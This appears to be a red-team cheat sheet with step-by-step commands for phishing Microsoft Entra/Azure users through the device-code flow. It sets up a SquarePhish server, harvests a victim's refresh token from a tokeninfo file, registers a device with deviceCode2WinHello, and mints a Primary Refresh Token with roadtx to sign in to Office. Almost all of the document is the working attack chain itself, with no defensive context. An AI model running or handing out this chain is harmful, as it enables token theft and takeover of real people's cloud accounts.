### Sources
* https://github.com/secureworks/squarephish
* https://github.com/kiwids0220/deviceCode2WinHello/blob/main/main.py
* https://github.com/dirkjanm/ROADtools
* https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens

### Generate certificate
```
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes -keyout &lt;keyfile&gt;.key -out &lt;certfile&gt;.crt
```

### Adjust server config (use application ID of Microsoft Authentication Broker)
```
vim settings.config

# modify
CERT_CRT = "&lt;path&gt;/&lt;certFile&gt;.crt" # Server SSL certificate .crt file
CERT_KEY = "&lt;path&gt;/&lt;privKey&gt;.key" # Server SSL certificate .key file
CLIENT_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e"
```

### Start server
```
python3 squish.py server
```

### Retreive refresh token once available
```
cat &lt;victim&gt;@&lt;domain&gt;.tokeninfo.json
```

### Use deviceCode2WinHello and refresh token to trigger device registration in Azure/Entra 
```
python3 register-flow.py --wfb -r &lt;refreshToken&gt;
```

### Get Primary Refresh Token (roadtx.prt)
```
roadtx prt --refresh-token &lt;refreshToken&gt; -c &lt;pemFile&gt;.pem -k &lt;keyfile&gt;.key
```

### Use PRT
```
roadtx browserprtauth -url https://office.com
```


